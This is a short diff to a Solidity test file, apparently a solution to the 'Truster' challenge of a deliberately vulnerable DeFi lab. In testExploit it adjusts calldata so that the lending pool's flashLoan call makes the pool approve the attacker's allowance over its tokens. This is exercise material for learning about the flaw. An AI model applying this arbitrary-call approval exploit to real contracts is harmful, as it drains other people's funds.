@@ -40,11 +40,11 @@ contract Truster is Test {
     function testExploit() public {
         /** EXPLOIT START **/
         
-        bytes memory data = abi.encode(abi.encodeWithSignature(
+        bytes memory data = abi.encodeWithSignature(
             "approve(address, uint256)",
             address(attacker),
-            type(uint256).max
-        ));        
+            TOKENS_IN_POOL
+        );        
         trusterLenderPool.flashLoan(
             TOKENS_IN_POOL,
             address(trusterLenderPool),
